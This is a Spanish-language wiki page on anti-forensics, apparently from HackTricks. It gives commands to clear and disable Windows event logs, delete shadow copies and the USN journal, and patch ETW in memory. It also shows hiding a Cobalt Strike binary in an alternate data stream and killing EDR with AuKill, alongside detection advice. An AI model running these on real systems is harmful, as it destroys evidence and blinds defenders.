# Técnicas antiforenses

{{#include ../../banners/hacktricks-training.md}}

## Marcas de tiempo

Un atacante podría querer **cambiar las marcas de tiempo de los archivos** para evitar que lo detecten.\
Es posible encontrar las marcas de tiempo dentro de la MFT, en los atributos `$STANDARD_INFORMATION` \_\_ y \_\_ `$FILE_NAME`.

Ambos atributos tienen 4 marcas de tiempo: **modificación**, **acceso**, **creación** y **modificación del registro de la MFT** (MACE o MACB).

El **Explorador de Windows** y otras herramientas muestran la información de **`$STANDARD_INFORMATION`**.

### TimeStomp - Herramienta antiforense

Esta herramienta **modifica** la información de las marcas de tiempo dentro de **`$STANDARD_INFORMATION`**, **pero no** la información dentro de **`$FILE_NAME`**. Por lo tanto, es posible **identificar** **actividad** **sospechosa**.

### Usnjrnl

El **USN Journal** (diario de números de secuencia de actualización) es una función de NTFS (sistema de archivos de Windows NT) que registra los cambios en el volumen. La herramienta [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) permite examinar estos cambios.

![TimeStomp - Herramienta antiforense - Usnjrnl: El USN Journal (diario de números de secuencia de actualización) es una función de NTFS (sistema de archivos de Windows NT) que registra los cambios en el volumen. La...](<../../images/image (801).png>)

La imagen anterior muestra la **salida** de la **herramienta**, donde se puede observar que se **realizaron algunos cambios** en el archivo.

### $LogFile

**Todos los cambios de metadatos en un sistema de archivos se registran** mediante un proceso conocido como [registro de escritura anticipada](https://en.wikipedia.org/wiki/Write-ahead_logging). Los metadatos registrados se almacenan en un archivo llamado `**$LogFile**`, ubicado en el directorio raíz de un sistema de archivos NTFS. Se pueden usar herramientas como [LogFileParser](https://github.com/jschicht/LogFileParser) para analizar este archivo e identificar cambios.

![Usnjrnl - $LogFile: Todos los cambios de metadatos en un sistema de archivos se registran mediante un proceso conocido como registro de escritura anticipada. Los metadatos registrados se almacenan en un archivo llamado $LogFile , ubicado en el directorio raíz...](<../../images/image (137).png>)

De nuevo, en la salida de la herramienta es posible ver que **se realizaron algunos cambios**.

Con la misma herramienta es posible identificar **a qué hora se modificaron las marcas de tiempo**:

![Usnjrnl - $LogFile: Con la misma herramienta es posible identificar a qué hora se modificaron las marcas de tiempo](<../../images/image (1089).png>)

- CTIME: Hora de creación del archivo
- ATIME: Hora de modificación del archivo
- MTIME: Modificación del registro de la MFT del archivo
- RTIME: Hora de acceso al archivo

### Comparación de `$STANDARD_INFORMATION` y `$FILE_NAME`

Otra forma de identificar archivos modificados sospechosos sería comparar las horas de ambos atributos para encontrar **discrepancias**.

### Nanosegundos

Las marcas de tiempo de **NTFS** tienen una **precisión** de **100 nanosegundos**. Por lo tanto, encontrar archivos con marcas de tiempo como 2010-10-10 10:10:**00.000:0000 es muy sospechoso**.

### SetMace - Herramienta antiforense

Esta herramienta puede modificar ambos atributos, `$STARNDAR_INFORMATION` y `$FILE_NAME`. Sin embargo, desde Windows Vista, se necesita un sistema operativo activo para modificar esta información.

## Ocultación de datos

NFTS usa un clúster y el tamaño mínimo de la información. Eso significa que si un archivo ocupa un clúster y medio, la **mitad restante nunca se utilizará** hasta que se elimine el archivo. Por lo tanto, es posible **ocultar datos en este espacio residual**.

Hay herramientas como slacker que permiten ocultar datos en este espacio «oculto». Sin embargo, un análisis de `$logfile` y `$usnjrnl` puede revelar que se añadieron datos:

![SetMace - Herramienta antiforense - Ocultación de datos: Hay herramientas como slacker que permiten ocultar datos en este espacio «oculto». Sin embargo, un análisis de $logfile y $usnjrnl puede revelar que...](<../../images/image (1060).png>)

Por lo tanto, es posible recuperar el espacio residual con herramientas como FTK Imager. Ten en cuenta que este tipo de herramienta puede guardar el contenido ofuscado o incluso cifrado.

## UsbKill

Esta herramienta **apaga el equipo si detecta algún cambio en los puertos USB**.\
Una forma de descubrirla sería inspeccionar los procesos en ejecución y **revisar cada script de Python en ejecución**.

## Distribuciones Linux en vivo

Estas distribuciones se **ejecutan en la memoria RAM**. La única forma de detectarlas es **si el sistema de archivos NTFS está montado con permisos de escritura**. Si se monta solo con permisos de lectura, no será posible detectar la intrusión.

## Eliminación segura

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Aut eliminación diferida de Windows

Una imagen de Windows en ejecución puede estar bloqueada mientras su proceso está activo. Un proceso puede delegar la eliminación a un proceso hijo `cmd.exe`, usar `choice` como temporizador y finalizar antes de que el shell llegue a `del`. La demora permite que el proceso original libere el identificador de su imagen; es necesario entrecomillar la ruta completa si contiene espacios.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

Cuando esta cadena se proporciona directamente como argumento a `cmd.exe`, en lugar de escribirse desde otro símbolo del sistema `cmd` interactivo, usa `&` en vez de `^&` y `>nul` en vez de `^>nul`. Esto elimina la entrada del directorio; **no es un borrado seguro** y no elimina rastros forenses de ejecución, tareas, diarios del sistema de archivos ni otros. Busca procesos secundarios de `cmd.exe` de corta duración cuya línea de comandos combine `choice /T`, `Del` y la ruta de imagen del proceso principal.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Configuración de Windows

Es posible deshabilitar varios métodos de registro de Windows para dificultar mucho la investigación forense.

### Deshabilitar marcas de tiempo - UserAssist

Esta clave del registro mantiene las fechas y horas en que el usuario ejecutó cada archivo ejecutable.

Para deshabilitar UserAssist, se requieren dos pasos:

1. Establece en cero estas dos claves del registro: `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` y `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, para indicar que queremos deshabilitar UserAssist.
2. Borra las subclaves del registro con nombres como `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Deshabilitar marcas de tiempo - Prefetch

Esto guarda información sobre las aplicaciones ejecutadas con el objetivo de mejorar el rendimiento del sistema Windows. Sin embargo, también puede ser útil en las prácticas forenses.

- Ejecuta `regedit`
- Selecciona la ruta del archivo `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Haz clic derecho en `EnablePrefetcher` y `EnableSuperfetch`
- Selecciona Modify en cada uno para cambiar el valor de 1 (o 3) a 0
- Reinicia

### Deshabilitar marcas de tiempo - Hora del último acceso

Cada vez que se abre una carpeta desde un volumen NTFS en un servidor Windows NT, el sistema **actualiza un campo de marca de tiempo en cada carpeta de la lista**, llamado hora del último acceso. En un volumen NTFS con mucho uso, esto puede afectar al rendimiento.

1. Abre el Editor del Registro (Regedit.exe).
2. Ve a `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Busca `NtfsDisableLastAccessUpdate`. Si no existe, crea este DWORD y establece su valor en 1 para deshabilitar el proceso.
4. Cierra el Editor del Registro y reinicia el servidor.

### Eliminar el historial de USB

Todas las **entradas de dispositivos USB** se almacenan en el Registro de Windows, bajo la clave del registro **USBSTOR**, que contiene subclaves creadas cada vez que conectas un dispositivo USB a tu PC o portátil. Puedes encontrar esta clave aquí: H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Al eliminarla**, borrarás el historial de USB.\
También puedes usar la herramienta [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) para asegurarte de que se hayan eliminado (y para eliminarlos).

Otro archivo que guarda información sobre los USB es `setupapi.dev.log`, ubicado en `C:\Windows\INF`. También debería eliminarse.

### Deshabilitar las instantáneas

**Lista** las instantáneas con `vssadmin list shadowstorage`\
**Elimínalas** ejecutando `vssadmin delete shadow`

También puedes eliminarlas mediante la interfaz gráfica siguiendo los pasos propuestos en [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Para deshabilitar las instantáneas, sigue [estos pasos](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Abre el programa Servicios escribiendo "services" en el cuadro de búsqueda de texto después de hacer clic en el botón Inicio de Windows.
2. En la lista, busca "Volume Shadow Copy", selecciónalo y haz clic derecho para acceder a Properties.
3. Elige Disabled en el menú desplegable "Startup type" y confirma el cambio haciendo clic en Apply y OK.

También es posible modificar en el registro la configuración de los archivos que se copiarán en la instantánea, en `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Sobrescribir archivos eliminados

- Puedes usar una **herramienta de Windows**: `cipher /w:C`. Esto indica a cipher que elimine cualquier dato del espacio disponible no utilizado de la unidad C.
- También puedes usar herramientas como [**Eraser**](https://eraser.heidi.ie)

### Eliminar registros de eventos de Windows

- Windows + R --> eventvwr.msc --> Expande "Windows Logs" --> Haz clic derecho en cada categoría y selecciona "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Deshabilitar los registros de eventos de Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- En la sección de servicios, deshabilita el servicio "Windows Event Log"
- `WEvtUtil.exec clear-log` o `WEvtUtil.exe cl`

### Deshabilitar $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Registro avanzado y manipulación de rastros (2023-2025)

### Registro de ScriptBlock/Module de PowerShell

Las versiones recientes de Windows 10/11 y Windows Server conservan **abundantes artefactos forenses de PowerShell** en
`Microsoft-Windows-PowerShell/Operational` (eventos 4104/4105/4106).  
Los atacantes pueden deshabilitarlos o borrarlos sobre la marcha:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Los defensores deben supervisar los cambios en esas claves del registro y la eliminación masiva de eventos de PowerShell.

### Parche de ETW (Event Tracing for Windows)

Los productos de seguridad para endpoints dependen en gran medida de ETW. Un método de evasión popular en 2024 consiste en parchear `ntdll!EtwEventWrite`/`EtwEventWriteFull` en memoria para que cada llamada a ETW devuelva `STATUS_SUCCESS` sin emitir el evento:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Los PoC públicos (p. ej., `EtwTiSwallow`) implementan la misma primitiva en PowerShell o C++.  
Como el parche es **local al proceso**, los EDR que se ejecutan dentro de otros procesos podrían no detectarlo.<sup>[[5]](#references)</sup>
Detección: comparar `ntdll` en memoria con la copia en disco, o enganchar antes del modo usuario.

### Resurgimiento de Alternate Data Streams (ADS)

Se ha visto que campañas de malware de 2023 (p. ej., los loaders de **FIN12**) preparan binarios de segunda etapa dentro de ADS para que los escáneres tradicionales no los detecten:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Enumera los streams con `dir /R`, `Get-Item -Stream *` o Sysinternals `streams64.exe`.
Copiar el archivo host a FAT/exFAT o mediante SMB eliminará el stream oculto y puede permitir
que los investigadores recuperen el payload.

### BYOVD y «AuKill» (2023)

Bring-Your-Own-Vulnerable-Driver se usa ahora habitualmente para **fines anti-forenses** en intrusiones de ransomware.  
La herramienta de código abierto **AuKill** carga un driver firmado pero vulnerable (`procexp152.sys`) para
suspender o terminar los sensores EDR y forenses **antes del cifrado y la destrucción de logs**:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

El controlador se elimina después, dejando artefactos mínimos.<sup>[[1]](#references)</sup>  
Mitigaciones: habilitar la lista de bloqueo de controladores vulnerables de Microsoft (HVCI/SAC)
y alertar sobre la creación de servicios del kernel desde rutas en las que los usuarios puedan escribir.

---

## Linux Anti-Forensics: autoparcheo y C2 en la nube (2023–2025)

### Autoparcheo de servicios comprometidos para reducir la detección (Linux)
Los adversarios recurren cada vez más al «autoparcheo» de un servicio justo después de explotarlo, tanto para evitar que vuelvan a explotarlo como para suprimir las detecciones basadas en vulnerabilidades. La idea es reemplazar los componentes vulnerables por los binarios/JAR legítimos más recientes del proyecto upstream, de modo que los escáneres indiquen que el host está parcheado mientras la persistencia y el C2 siguen activos.<sup>[[3]](#references)</sup>

Ejemplo: RCE de Apache ActiveMQ OpenWire (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Tras la explotación, los atacantes descargaron JAR legítimos de Maven Central (repo1.maven.org), eliminaron los JAR vulnerables de la instalación de ActiveMQ y reiniciaron el broker.
- Esto cerró la RCE inicial mientras se mantenían otros puntos de acceso (cron, cambios en la configuración de SSH e implantes de C2 independientes).

Ejemplo operativo (ilustrativo)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Consejos forenses/de búsqueda
- Revisa los directorios de servicios en busca de reemplazos no programados de binarios/JAR:
  - Debian/Ubuntu: `dpkg -V activemq` y compara los hashes/rutas de los archivos con los mirrors del repositorio.
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - Busca versiones de JAR presentes en el disco que no pertenezcan al gestor de paquetes, o enlaces simbólicos actualizados por fuera del proceso habitual.
- Cronología: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` para correlacionar ctime/mtime con el período de compromiso.
- Historial de shell/telemetría de procesos: evidencia de `curl`/`wget` a `repo1.maven.org` u otros CDN de artefactos inmediatamente después de la explotación inicial.
- Gestión de cambios: valida quién aplicó el “parche” y por qué, no solo que haya una versión parcheada.

### C2 mediante servicios en la nube con tokens bearer y stagers anti-análisis
El tradecraft observado combinó varias rutas de C2 de larga duración y empaquetado anti-análisis:<sup>[[3]](#references)</sup>
- Cargadores ELF de PyInstaller protegidos con contraseña para dificultar el sandboxing y el análisis estático (p. ej., PYZ cifrado, extracción temporal bajo `/_MEI*`).
  - Indicadores: resultados de `strings` como `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
  - Artefactos de ejecución: extracción a `/tmp/_MEI*` o rutas personalizadas de `--runtime-tmpdir`.
- C2 respaldado por Dropbox que usa tokens OAuth Bearer codificados en el binario
  - Indicadores de red: `api.dropboxapi.com` / `content.dropboxapi.com` con `Authorization: Bearer <token>`.
  - Busca en proxy/NetFlow/Zeek/Suricata conexiones HTTPS salientes a dominios de Dropbox desde cargas de trabajo de servidores que normalmente no sincronizan archivos.
- C2 paralelo/de respaldo mediante tunneling (p. ej., Cloudflare Tunnel `cloudflared`), para mantener el control si se bloquea un canal.
  - IOCs del host: procesos/unidades `cloudflared`, configuración en `~/.cloudflared/*.json`, conexiones salientes por el puerto 443 a los nodos perimetrales de Cloudflare.

### Persistencia y “reversión del hardening” para mantener el acceso (ejemplos de Linux)
Los atacantes suelen combinar el autoparcheo con vías de acceso persistentes:<sup>[[3]](#references)</sup>
- Cron/Anacron: modificaciones del stub `0anacron` en cada directorio `/etc/cron.*/` para ejecución periódica.
  - Busca:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- Reversión del hardening de la configuración de SSH: habilitar los inicios de sesión de root y cambiar los shells predeterminados de las cuentas con pocos privilegios.
  - Busca indicios de que se hayan habilitado los inicios de sesión de root:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - Busca shells interactivos sospechosos en cuentas del sistema (p. ej., `games`):
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Artefactos beacon aleatorios con nombres cortos (8 caracteres alfabéticos) que se escriben en disco y también se comunican con un C2 en la nube:
  - Buscar:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Los defensores deberían correlacionar estos artefactos con la exposición externa y los eventos de aplicación de parches a los servicios para descubrir la autorremediación antiforense utilizada para ocultar la explotación inicial.

## References

- [1] [Sophos X-Ops – AuKill: un controlador vulnerable convertido en arma para deshabilitar EDR (marzo de 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Modificación de EtwEventWrite para operar de forma encubierta: detección e investigación (junio de 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Aplicación de parches para mantener la persistencia: cómo el malware Linux DripDropper se propaga por la nube](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – RCE en Apache ActiveMQ OpenWire (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Ocultar tu .NET - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – Descubrimiento de una variante de SectopRAT integrada en software legítimo](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – comando choice](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – comando del](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
{{#include ../../banners/hacktricks-training.md}}
